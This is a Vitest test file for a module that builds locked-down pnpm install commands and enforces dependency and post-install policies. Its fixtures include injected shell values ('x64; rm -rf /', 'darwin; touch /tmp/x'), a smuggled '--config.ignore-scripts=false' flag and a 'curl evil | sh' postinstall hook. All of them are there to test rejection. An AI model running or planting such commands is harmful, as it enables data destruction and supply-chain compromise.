import { describe, expect, it } from 'vitest';
import { buildChildEnv } from './child-env.js';
import {
  assertInstallSafe,
  buildPnpmInstallArgs,
  classifyDependencySpec,
  findBuildStepPackages,
  findDisallowedDependencies,
  findLeftoverLinks,
  findNormalizationTargets,
  isRegistryResolution,
  stripLifecycleScripts,
  type TreeEntry,
} from './install-args.js';
import { TARGETS } from './targets.js';

const COMMON = ['--frozen-lockfile', '--prod', '--ignore-scripts'];
const CONFIG = [
  '--config.node-linker=hoisted',
  '--config.side-effects-cache=false',
  '--config.package-import-method=copy',
  '--config.verify-store-integrity=true',
];

const GOLDEN: Record<string, string[]> = {
  'aarch64-apple-darwin': ['--os', 'darwin', '--cpu', 'arm64'],
  'x86_64-apple-darwin': ['--os', 'darwin', '--cpu', 'x64'],
  'x86_64-unknown-linux-gnu': [
    '--os',
    'linux',
    '--cpu',
    'x64',
    '--libc',
    'glibc',
  ],
  'aarch64-unknown-linux-gnu': [
    '--os',
    'linux',
    '--cpu',
    'arm64',
    '--libc',
    'glibc',
  ],
  'x86_64-pc-windows-msvc': ['--os', 'win32', '--cpu', 'x64'],
  'aarch64-pc-windows-msvc': ['--os', 'win32', '--cpu', 'arm64'],
};

describe('buildPnpmInstallArgs', () => {
  it('builds the exact pnpm argv for each target', () => {
    expect(TARGETS.map((t) => t.triple).sort()).toEqual(
      Object.keys(GOLDEN).sort(),
    );
    for (const spec of TARGETS) {
      expect(buildPnpmInstallArgs({ target: spec })).toEqual([
        'install',
        ...COMMON,
        ...(GOLDEN[spec.triple] as string[]),
        ...CONFIG,
      ]);
    }
  });

  it('appends --offline last when asked', () => {
    const spec = TARGETS[0] as (typeof TARGETS)[number];
    const args = buildPnpmInstallArgs({ target: spec, offline: true });
    expect(args.at(-1)).toBe('--offline');
    expect(args.slice(0, -1)).toEqual(buildPnpmInstallArgs({ target: spec }));
  });

  it('never passes a flag that enables scripts for any target', () => {
    for (const spec of TARGETS) {
      for (const offline of [false, true]) {
        const args = buildPnpmInstallArgs({ target: spec, offline });
        expect(args).toContain('--ignore-scripts');
        expect(args).toContain('--frozen-lockfile');
        expect(args).toContain('--prod');
        expect(args).not.toContain('--no-ignore-scripts');
        expect(
          args.some((a) => /dangerously|allow-?scripts|--unsafe/i.test(a)),
        ).toBe(false);
        expect(args).toContain('--config.side-effects-cache=false');
      }
    }
  });

  it('uses only fixed tokens: no argument is derived from free text', () => {
    const fixed = new Set([
      'install',
      ...COMMON,
      ...CONFIG,
      '--offline',
      '--os',
      '--cpu',
      '--libc',
      'darwin',
      'linux',
      'win32',
      'arm64',
      'x64',
      'glibc',
    ]);
    for (const spec of TARGETS) {
      for (const arg of buildPnpmInstallArgs({ target: spec, offline: true })) {
        expect(fixed.has(arg)).toBe(true);
      }
    }
  });

  it('refuses values outside the closed sets', () => {
    const bad = [
      { pnpm: { os: 'freebsd', cpu: 'x64' } },
      { pnpm: { os: 'darwin', cpu: 'ia32' } },
      { pnpm: { os: 'darwin', cpu: 'x64; rm -rf /' } },
      { pnpm: { os: 'linux', cpu: 'x64' } },
      { pnpm: { os: 'linux', cpu: 'x64', libc: 'musl' } },
      { pnpm: { os: 'darwin', cpu: 'x64', libc: 'glibc' } },
      { pnpm: { os: '--config.ignore-scripts=false', cpu: 'x64' } },
    ];
    for (const target of bad) {
      expect(() => buildPnpmInstallArgs({ target })).toThrow(
        expect.objectContaining({ code: 'invalid_install_plan' }),
      );
    }
  });
});

describe('assertInstallSafe', () => {
  const env = buildChildEnv({}, {}, { platform: 'linux' });
  const args = buildPnpmInstallArgs({ target: TARGETS[0] as never });

  it('accepts the argv this module builds with the forced environment', () => {
    for (const spec of TARGETS) {
      expect(() =>
        assertInstallSafe(
          buildPnpmInstallArgs({ target: spec, offline: true }),
          env,
        ),
      ).not.toThrow();
    }
  });

  it('refuses anything that could re-enable scripts or loosen the install', () => {
    const tampered: string[][] = [
      args.filter((a) => a !== '--ignore-scripts'),
      args.filter((a) => a !== '--frozen-lockfile'),
      [...args, '--no-ignore-scripts'],
      [...args, '--ignore-scripts=false'],
      [...args, '--config.ignore-scripts=false'],
      [...args, '--dangerously-allow-all-builds'],
      [...args, '--no-frozen-lockfile'],
      [...args, '--os', 'win32'],
      ['add', ...args.slice(1)],
      args.map((a) => (a === 'darwin' ? 'darwin; touch /tmp/x' : a)),
      args.filter((a) => !a.startsWith('--config.side-effects')),
    ];
    for (const candidate of tampered) {
      expect(() => assertInstallSafe(candidate, env)).toThrow(
        expect.objectContaining({ code: 'install_unsafe' }),
      );
    }
  });

  it('refuses an environment that no longer forces ignore-scripts', () => {
    expect(() =>
      assertInstallSafe(args, { ...env, npm_config_ignore_scripts: 'false' }),
    ).toThrow(expect.objectContaining({ code: 'install_unsafe' }));
    expect(() => assertInstallSafe(args, {})).toThrow(
      expect.objectContaining({ code: 'install_unsafe' }),
    );
  });
});

describe('dependency policy', () => {
  it('classifies specifiers', () => {
    const cases: Array<[string, string]> = [
      ['^1.2.3', 'registry'],
      ['1.2.3', 'registry'],
      ['>=1 <2 || ^3', 'registry'],
      ['*', 'registry'],
      ['latest', 'registry'],
      ['catalog:', 'registry'],
      ['npm:other@^1', 'alias'],
      ['link:../x', 'link'],
      ['portal:../x', 'link'],
      ['file:../x.tgz', 'file'],
      ['./vendor/x', 'file'],
      ['/abs/x', 'file'],
      ['workspace:*', 'workspace'],
      ['git+https://github.com/a/b.git#abc', 'git'],
      ['github:a/b', 'git'],
      ['git://host/a.git', 'git'],
      ['a/b', 'git'],
      ['a/b#semver:^1', 'git'],
      ['https://example.com/x.tgz', 'tarball'],
      ['http://example.com/x.tgz', 'tarball'],
    ];
    for (const [spec, kind] of cases) {
      expect([spec, classifyDependencySpec(spec)]).toEqual([spec, kind]);
    }
  });

  it('rejects link:, file:, git and tarball production dependencies', () => {
    expect(
      findDisallowedDependencies({
        dependencies: {
          good: '^1.0.0',
          alias: 'npm:real@^2',
          zeta: 'link:../zeta',
          alpha: 'file:./alpha.tgz',
          gitty: 'github:a/b',
          tar: 'https://x.example/t.tgz',
          ws: 'workspace:*',
        },
        optionalDependencies: { opt: 'git+ssh://git@host/r.git', alpha: '^1' },
      }),
    ).toEqual([
      { name: 'alpha', kind: 'file' },
      { name: 'gitty', kind: 'git' },
      { name: 'opt', kind: 'git' },
      { name: 'tar', kind: 'tarball' },
      { name: 'ws', kind: 'workspace' },
      { name: 'zeta', kind: 'link' },
    ]);
    expect(findDisallowedDependencies({})).toEqual([]);
    expect(
      findDisallowedDependencies({ dependencies: { weird: 42 as never } }),
    ).toEqual([{ name: 'weird', kind: 'unknown' }]);
  });

  it('accepts registry resolutions with integrity only', () => {
    expect(isRegistryResolution({ integrity: 'sha512-abc' })).toBe(true);
    expect(
      isRegistryResolution({
        integrity: 'sha512-abc',
        tarball: 'https://x/y.tgz',
      }),
    ).toBe(false);
    expect(isRegistryResolution({ directory: '../x', type: 'directory' })).toBe(
      false,
    );
    expect(isRegistryResolution({ type: 'git', repo: 'r', commit: 'c' })).toBe(
      false,
    );
    expect(isRegistryResolution({})).toBe(false);
    expect(isRegistryResolution(null)).toBe(false);
    expect(isRegistryResolution('sha512-abc')).toBe(false);
  });

  it('strips lifecycle scripts from the staged manifest without mutating it', () => {
    const manifest = Object.freeze({
      name: 'app',
      scripts: { postinstall: 'curl evil | sh', build: 'x' },
      dependencies: { a: '^1' },
    });
    const staged = stripLifecycleScripts(manifest);
    expect(staged).toEqual({ name: 'app', dependencies: { a: '^1' } });
    expect(staged).not.toHaveProperty('scripts');
    expect(manifest.scripts.postinstall).toBe('curl evil | sh');
  });
});

describe('post-install checks', () => {
  const tree: TreeEntry[] = [
    { path: '.bin', kind: 'directory' },
    { path: '.bin/vite', kind: 'symlink' },
    { path: '.modules.yaml', kind: 'file' },
    { path: '.pnpm', kind: 'directory' },
    { path: '.pnpm/a@1', kind: 'directory' },
    { path: '.pnpm-workspace-state-v1.json', kind: 'file' },
    { path: '.package-lock.json', kind: 'file' },
    { path: 'a', kind: 'directory' },
    { path: 'a/package.json', kind: 'file' },
    { path: 'a/node_modules', kind: 'directory' },
    { path: 'a/node_modules/.bin', kind: 'directory' },
    { path: 'a/node_modules/.bin/tool', kind: 'symlink' },
    { path: 'b', kind: 'symlink' },
    { path: 'c/fifo', kind: 'other' },
    { path: 'dir.bin', kind: 'directory' },
  ];

  it('lists the top-most paths the normalisation step removes', () => {
    expect(findNormalizationTargets(tree)).toEqual([
      '.bin',
      '.modules.yaml',
      '.package-lock.json',
      '.pnpm',
      '.pnpm-workspace-state-v1.json',
      'a/node_modules/.bin',
    ]);
  });

  it('reports every symlink, junction, FIFO and device left in the tree', () => {
    expect(findLeftoverLinks(tree)).toEqual([
      '.bin/vite',
      'a/node_modules/.bin/tool',
      'b',
      'c/fifo',
    ]);
    const removed = new Set(findNormalizationTargets(tree));
    const remaining = tree.filter(
      (e) =>
        ![...removed].some((r) => e.path === r || e.path.startsWith(`${r}/`)),
    );
    expect(findLeftoverLinks(remaining)).toEqual(['b', 'c/fifo']);
  });

  it('fails a package with an install script and no prebuilt binary', () => {
    expect(
      findBuildStepPackages([
        { name: 'needs-build', scripts: { install: 'node-gyp rebuild' } },
        { name: 'gyp-only', hasBindingGyp: true },
        { name: 'flag', gypfile: true },
        { name: 'pre', scripts: { preinstall: 'x' } },
        {
          name: 'prebuilt',
          scripts: { install: 'node-gyp-build' },
          hasPrebuiltNode: true,
        },
        { name: 'plain', scripts: { test: 'vitest', build: 'x' } },
      ]),
    ).toEqual(['flag', 'gyp-only', 'needs-build', 'pre']);
  });

  it('allows the closed list of harmless postinstall packages', () => {
    expect(
      findBuildStepPackages([
        { name: 'esbuild', scripts: { postinstall: 'node install.js' } },
        { name: 'fsevents', hasBindingGyp: true },
        {
          name: 'protobufjs',
          scripts: { postinstall: 'node scripts/postinstall' },
        },
      ]),
    ).toEqual([]);
    expect(
      findBuildStepPackages([
        { name: 'esbuild-evil', scripts: { postinstall: 'x' } },
      ]),
    ).toEqual(['esbuild-evil']);
  });
});
